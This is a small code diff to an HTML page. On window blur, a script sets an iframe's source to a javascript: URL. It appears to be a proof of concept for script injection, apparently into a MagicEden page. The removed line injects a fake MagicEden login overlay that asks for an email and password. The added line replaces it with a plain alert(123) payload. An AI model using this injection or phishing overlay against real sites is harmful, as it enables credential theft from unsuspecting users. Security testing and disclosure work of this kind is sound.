@@ -11,7 +11,7 @@
   </style>
   <script>
     window.onblur = function () {
-      document.getElementById("iframe").src = "javascript:(function(){document.body.innerHTML='<div style=\\\"position:fixed;top:30%;left:30%;background:#fff;padding:20px;border:1px solid #ccc;z-index:9999;font-family:sans-serif;\\\"><h3>Login Required</h3><p>Please enter your MagicEden credentials:</p><input type=\\\"text\\\" placeholder=\\\"Email\\\"><br><input type=\\\"password\\\" placeholder=\\\"Password\\\"><br><button onclick=\\\"alert(\\'Submitted\\')\\\">Submit</button></div>';})()";
+      document.getElementById("iframe").src = "javascript:console.log(alert(123))";
     };
   </script>
 </head>
